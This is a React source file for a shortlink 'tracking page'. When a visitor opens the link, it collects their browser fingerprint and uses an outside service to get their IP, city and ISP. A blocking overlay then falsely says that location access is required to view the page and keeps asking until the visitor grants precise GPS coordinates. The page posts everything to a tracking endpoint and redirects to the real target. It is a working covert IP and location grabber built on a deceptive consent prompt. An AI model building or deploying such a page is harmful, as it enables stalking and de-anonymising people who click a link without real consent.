import { useEffect, useState } from "react";

export default function TrackingPage() {
  const [locationStatus, setLocationStatus] = useState<'pending' | 'granted' | 'denied'>('pending');
  const [loading, setLoading] = useState(true);
  const [targetUrl, setTargetUrl] = useState<string | null>(null);
  const [shortlinkId, setShortlinkId] = useState<number | null>(null);
  const [data, setData] = useState<{ [key: string]: any }>({});

  useEffect(() => {
    (async function() {
      // Get slug from URL
      const slug = window.location.pathname.split("/s/")[1];
      // Fetch target URL and shortlinkId from backend
      const res = await fetch(`/api/shortlink-meta/${slug}`);
      if (!res.ok) {
        window.location.href = "/not-found";
        return;
      }
      const { targetUrl, shortlinkId } = await res.json();
      setTargetUrl(targetUrl);
      setShortlinkId(shortlinkId);

      // Parse user agent for detailed info
      function parseUserAgent(ua: string) {
        const result = {
          browser: 'Unknown',
          os: 'Unknown',
          deviceModel: 'Unknown',
          deviceType: 'Unknown',
          androidVersion: null as string | null
        };
        if (ua.includes('Chrome/') && !ua.includes('Edg/')) {
          const chromeMatch = ua.match(/Chrome\/([\d.]+)/);
          result.browser = chromeMatch ? 'Chrome ' + chromeMatch[1] : 'Chrome';
        } else if (ua.includes('Firefox/')) {
          const firefoxMatch = ua.match(/Firefox\/([\d.]+)/);
          result.browser = firefoxMatch ? 'Firefox ' + firefoxMatch[1] : 'Firefox';
        } else if (ua.includes('Safari/') && !ua.includes('Chrome/')) {
          const safariMatch = ua.match(/Version\/([\d.]+)/);
          result.browser = safariMatch ? 'Safari ' + safariMatch[1] : 'Safari';
        } else if (ua.includes('Edg/')) {
          const edgeMatch = ua.match(/Edg\/([\d.]+)/);
          result.browser = edgeMatch ? 'Edge ' + edgeMatch[1] : 'Edge';
        }
        if (ua.includes('Windows NT')) {
          const winMatch = ua.match(/Windows NT ([\d.]+)/);
          result.os = winMatch ? 'Windows ' + winMatch[1] : 'Windows';
        } else if (ua.includes('Mac OS X')) {
          const macMatch = ua.match(/Mac OS X ([\d_]+)/);
          result.os = macMatch ? 'macOS ' + macMatch[1].replace(/_/g, '.') : 'macOS';
        } else if (ua.includes('Linux')) {
          result.os = 'Linux';
        } else if (ua.includes('Android')) {
          const androidMatch = ua.match(/Android ([\d.]+)/);
          result.os = androidMatch ? 'Android ' + androidMatch[1] : 'Android';
          result.androidVersion = androidMatch ? androidMatch[1] : null;
        } else if (ua.includes('iPhone OS') || ua.includes('iOS')) {
          const iosMatch = ua.match(/OS ([\d_]+)/);
          result.os = iosMatch ? 'iOS ' + iosMatch[1].replace(/_/g, '.') : 'iOS';
        }
        if (ua.includes('Mobile') || ua.includes('Android')) {
          result.deviceType = 'Mobile';
        } else if (ua.includes('Tablet') || ua.includes('iPad')) {
          result.deviceType = 'Tablet';
        } else {
          result.deviceType = 'Desktop';
        }
        if (ua.includes('Android')) {
          const modelMatch = ua.match(/\) ([^;]+);/);
          if (modelMatch) {
            result.deviceModel = modelMatch[1];
          }
        } else if (ua.includes('iPhone')) {
          result.deviceModel = 'iPhone';
        } else if (ua.includes('iPad')) {
          result.deviceModel = 'iPad';
        }
        return result;
      }
      // Use index signature to allow dynamic properties
      const userAgentInfo = parseUserAgent(navigator.userAgent);
      const baseData: { [key: string]: any } = {
        shortlinkId,
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenResolution: screen.width + 'x' + screen.height,
        browser: userAgentInfo.browser,
        os: userAgentInfo.os,
        deviceModel: userAgentInfo.deviceModel,
        deviceType: userAgentInfo.deviceType,
        androidVersion: userAgentInfo.androidVersion,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };
      // Try to get IP and location info with enhanced data
      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        baseData.ipAddress = ipData.ip;
        baseData.country = ipData.country_name;
        baseData.city = ipData.city;
        baseData.isp = ipData.org || ipData.isp;
      } catch (e) {
        // ignore
      }
      setData(baseData);
      setLoading(false);
    })();
  }, []);

  useEffect(() => {
    if (locationStatus === 'granted' && targetUrl && shortlinkId) {
      // Send data and redirect
      fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      setTimeout(() => {
        window.location.href = targetUrl;
      }, 1500);
    }
  }, [locationStatus, targetUrl, shortlinkId, data]);

  const requestLocation = () => {
    if (!navigator.geolocation) {
      setLocationStatus('denied');
      return;
    }
    setLocationStatus('pending');
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setData(prev => ({ ...prev, latitude: pos.coords.latitude, longitude: pos.coords.longitude }));
        setLocationStatus('granted');
      },
      (err) => {
        setLocationStatus('denied');
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-cyber-dark flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-xl font-semibold text-white mb-2">Loading...</h2>
          <p className="text-slate-400">Preparing redirect...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-cyber-dark flex items-center justify-center">
      {locationStatus === 'pending' && (
        <div className="fixed inset-0 bg-black/80 flex flex-col items-center justify-center z-50">
          <div className="bg-slate-800 rounded-lg p-8 shadow-xl text-center max-w-sm">
            <h2 className="text-2xl font-bold text-white mb-4">Location Required</h2>
            <p className="text-slate-300 mb-6">To continue, please allow location access. This is required to view the page you requested.</p>
            <button
              className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-semibold text-lg shadow"
              onClick={requestLocation}
            >
              Allow Location
            </button>
          </div>
        </div>
      )}
      {locationStatus === 'denied' && (
        <div className="fixed inset-0 bg-black/80 flex flex-col items-center justify-center z-50">
          <div className="bg-slate-800 rounded-lg p-8 shadow-xl text-center max-w-sm">
            <h2 className="text-2xl font-bold text-red-400 mb-4">Failed to Load</h2>
            <p className="text-slate-300 mb-6">You must allow location access to proceed. Please click below to try again.</p>
            <button
              className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-semibold text-lg shadow"
              onClick={requestLocation}
            >
              Try Again
            </button>
          </div>
        </div>
      )}
      <div className="text-center">
        <h2 className="text-xl font-semibold text-white mb-2">Redirecting...</h2>
        <p className="text-slate-400">Please wait while we redirect you...</p>
      </div>
    </div>
  );
}
